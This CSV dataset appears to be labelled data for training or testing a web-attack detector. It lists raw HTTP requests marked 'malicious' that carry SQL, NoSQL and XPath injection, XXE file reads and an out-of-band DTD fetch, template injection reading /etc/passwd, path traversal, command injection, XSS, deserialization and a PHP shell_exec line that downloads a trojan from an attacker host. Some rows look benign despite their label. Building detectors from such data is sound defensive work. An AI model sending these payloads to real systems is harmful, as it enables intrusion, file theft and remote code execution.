"text","label"
"PUT /api/preferences/set_advanced HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 300
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Origin: https://dashboard.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""currency"": ""USD"", ""show_recommended"": true}, ""cart_options"": {""save_for_later"": false, ""max_items"": 100}}}}","malicious"
"POST /api/v1/account/search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate
Cookie: sid=7f5e2c4d1a3b9e0f

{""query"":{""$where"":""this.username==='admin' && this.password.startsWith('a') || sleep(5000)""}}","malicious"
"POST /feedback/new HTTP/1.1
Host: api.safe-cloud-solutions.tech
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/xml
Accept: */*
Accept-Encoding: identity
Content-Length: 219

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>","malicious"
"GET /blog/article/view?title=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive","malicious"
"POST /api/v1/messages/send HTTP/1.1
Host: messaging.enterprise-hub.biz
Content-Type: application/json
Content-Length: 109
Accept: application/json
X-CSRF-Token: eab412f4db7e40dd8de76f6cc913dc12
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36

{""recipient"": ""developer"", ""message"": ""Check this out' Or 'x'='x' aNd SeLeCt UsEr()=user()""}","malicious"
"POST /app/user/submit-comment HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Length: 189

<?xml version=""1.0""?>
<!DOCTYPE feedback [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8081/internal/api"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: application/json
Accept-Encoding: deflate, gzip
Content-Type: application/json
Content-Length: 65
Cookie: lang_pref=../../../../var/log/auth.log%00default; sid=fa6472863ae42381

{""searchTerm"":""laptop"",""filters"":{""category"":""electronics"",""priceRange"":""100-1000""}}","malicious"
"GET /products/item%0d%0aX-Test-Header:%207%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2027%0d%0a%0d%0a<script>document.cookie=1</script> HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive","malicious"
"POST /api/v1/validate HTTP/1.1
Host: nextgen-cloud-solutions.net
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Sec-CH-UA: ""Chromium"";v=""90"", ""Google Chrome"";v=""90"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Cache-Control: no-cache

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}","malicious"
"GET /fetch/file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
Host: internal-portals.secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"GET /get_resource.cgi?file=../../../../../../../../etc/passwd HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: close","malicious"
"GET /search/results?search_term=smartphones%27%20UNION%20SELECT%20%40%40VERSION%2C%20SLEEP%285%29%2C%20USER%28%29--%20 HTTP/1.1
Host: urbanstyle-outfitters.biz
Connection: close
Accept: text/html,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Cookie: sid=0f1e73c9b85d4f299c5f63a84430b2ba; theme=dark","malicious"
"POST /api/v1/feedback/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Accept: */*
Origin: https://app.cloud-data-services.ai
Referer: https://app.cloud-data-services.ai/feedback

user_id=9876543&feedback=Great+service%21&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E","malicious"
"GET /file/viewer.php?template=../../../../../../../../etc/passwd HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive","malicious"
"POST /api/config/loadFromXml HTTP/1.1
Host: config-sync-platform.io
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: application/xml, text/xml
Content-Length: 453

<?xml version=""1.0"" encoding=""UTF-8""?>
<request>
  <data>
    <serializedData><![CDATA[AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAAVU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5Bc3NlbWJseUltcGxlbWVudGVyAwAAAAdTdGFydChTeXN0ZW0uRHlhZ25vc3RpY3MuUHJvY2VzcywgWydjYWxjLmV4ZScsICIvYy9jcmluLmV4ZSddKQ==]]></serializedData>
  </data>
</request>","malicious"
"POST /auth/login HTTP/1.1
Host: cloud-sync-solutions.me
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 72

username=alice&password=pass123'}); db.sessions.remove({user:'admin'}); //","malicious"
"POST /blog/article/comment HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://my-personal-blog-site.info/blog/article/view?id=123
Cookie: auth=xyz987abc654
Content-Length: 79

comment=Nice+post!%0aid%0aecho%20Injected%20via%20newline%0als%20-la%20/tmp","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: application/json
Referer: https://dashboard.cloud-data-services.ai/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}#}
Content-Length: 27

{""query"":""laptops"",""page"":1}","malicious"
"GET /search?q=laptop HTTP/1.1
Host: internal-db-server.local
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive","malicious"
"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
Cache-Control: no-cache
Connection: keep-alive","malicious"
"POST /metrics/collector HTTP/1.1
Host: telemetry.fast-streamer.ai
User-Agent: Python-urllib/3.9
Accept: application/xml
X-Callback-Server: http://dnsrebind-alerts-control.com/hit
Content-Type: text/plain
Content-Length: 22

status=active&checkpoint=1","malicious"
"GET /network/diagnostics/scan/192.168.1.1%7Chostname%20%7C%20whoami HTTP/1.1
Host: infra-monitoring-pro.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"POST /forum/post_reply HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Referer: https://community.game-dev-forum.org/thread/2345

thread_id=2345&username=gamer42&reply=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E","malicious"
"POST /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 134
Referer: https://api.cloud-data-services.ai/dashboard
Cookie: auth_sid=7e2d9c5a8b12f4c0d3e6b1a9f5d8c7e3

{""query"": ""/accounts/account[login='admin' and starts-with(secret,'p')]/accountId""}","malicious"
"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"POST /feeds/new HTTP/1.1
Host: blog-vault.my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/xml
Accept: application/xml,text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Length: 278

<!DOCTYPE post [
<!ENTITY % file SYSTEM ""file:///etc/hosts"">
<!ENTITY % dtd SYSTEM ""http://feed-control.net/evil.dtd"">
%dtd;
%send;
]>
<post>
  <title>Weekly update</title>
  <content>Hello world</content>
</post>","malicious"
"GET /app/view_profile?greeting=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: personalized-content-suite.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Referer: https://intranet-personalize.ai/app/dashboard
Connection: close","malicious"
"GET /blog/article/view%0d%0aX-Test-Header:%20value%0d%0aContent-Length:%2017%0d%0a%0d%0a<script>evilCode()</script> HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Connection: keep-alive","malicious"
"POST /blog/article/comment HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Referer: https://online-retail-store.biz/blog/article/view/8945
Content-Length: 110
Connection: keep-alive

comment=Great+products.%20%3C%3Fphp%20echo%20shell_exec%28%27wget%20http%3A%2F%2Fshadowops-echo.net%2Funion.php%20-O%20%2Ftmp%2Ftrojan.php%27%29%3B%20%3F%3E","malicious"
"POST /api/account/update HTTP/1.1
Host: logon.secure-payment-gateway.cc
Content-Type: application/json
X-CSRF-Token: fbc12ca8d0b440c9ba70db952457fa94
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Referer: https://logon.secure-payment-gateway.cc/dashboard
Cache-Control: max-age=0

{
  ""username"": ""pay_user77"",
  ""email"": ""payuser77@secure-payment-gateway.cc"",
  ""isAdmin"": true,
  ""subscription_plan"": ""vip""
}","malicious"
"PUT /soap/OrderService HTTP/1.1
Host: api.purchase-hub.ai
User-Agent: Python-urllib/3.9
Content-Type: text/xml;charset=UTF-8
Accept-Encoding: gzip, deflate
Content-Length: 261
Cache-Control: no-cache

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY localFile SYSTEM ""file:///var/log/auth.log"" >]>
<foo>
  <orderId>&localFile;</orderId>
  <customer>Jane D.</customer>
</foo>","malicious"
"GET /api/v3/items/search HTTP/1.1
Host: data-insights-suite.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept-Language: en-US,en;q=0.5
X-Headers-Info: <iframe src=""data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgnZGF0YS1pbnNpZ2h0cycpPC9zY3JpcHQ+PC9odG1sPg==""></iframe>
Cache-Control: max-age=0","malicious"
"GET /xml_api/search_books?author_name=Alice%27%20or%20//users/user[1]/password/text()%20contains%20%28_%2C%20%27root%27%29%20or%20%271%27%3D%271 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1","malicious"
"GET /content/user-upload/.%2E%2F.%2E%2F.%2E%2F.%2E%2Fvar/www/html/config.php HTTP/1.1
Host: media-assets-platform.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Encoding: gzip, deflate","malicious"
"POST /api/v2/users/login HTTP/1.1
Host: attacker-controlled-site.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Origin: https://login.app-saas-cloud.ai
Content-Length: 53

{""username"":""victim_user"",""password"":""safe_pass123""}","malicious"
"GET /api/v1/network/tracehop/198.51.100.23%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: smart-city-monitoring.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""92"", ""Google Chrome"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Connection: keep-alive","malicious"
"GET /tools/ping/host123%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml;q=0.9,application/xml;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://dashboard.secure-user-portal.net/login
Connection: close","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Length: 26

{""filePath"": ""/etc/hosts""}","malicious"
"GET /api/v3/items/12' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x40,(SELECT user()),0x40,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) -- HTTP/1.1
Host: data-analysis-reporting.ai
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.7
User-Agent: curl/7.77.0
Referer: https://data-analysis-reporting.ai/reports","malicious"
"POST /api/v2/layout/apply HTTP/1.1
Host: userportal-cloud-storage.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""91"", ""Google Chrome"";v=""91"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Accept: application/json, text/plain, */*
Content-Length: 173

{""render"":{""body"":{""html"":""Welcome back! <!--#exec cmd=\""c""""a""""t /e""""tc/hostname\""-->""}},""flags"":{""enableScripts"":false}}","malicious"
"GET /admin/dashboard HTTP/1.1
Host: secure-admin-portal.cloud
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 <svg/onload=alert('LogViewerXSS')> (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://secure-admin-portal.cloud/login
Upgrade-Insecure-Requests: 1","malicious"
"GET /proxy/fetch?target=https://intranet.finance-data.corp.local/data/export HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://portal.finance-data.corp.local/home","malicious"
"GET /catalog/query?product_code=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: nexus-electro-stock.biz
User-Agent: Wget/1.20
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: close","malicious"
"PUT /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 305
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Origin: https://online-retail-store.biz
X-Requested-With: FetchAPIClient
Accept: application/json, text/plain
Accept-Encoding: gzip, deflate

{""query"": ""wireless earbuds"", ""filters"": {""priceRange"": {""min"": 25, ""max"": 150}, ""availability"": ""in_stock""}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""searchFlag"", ""sortBy"": ""relevance""}","malicious"
"POST /login HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) CmdExec/1.0 $(echo vulnerable)
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=alice&password=verysecurepassword","malicious"
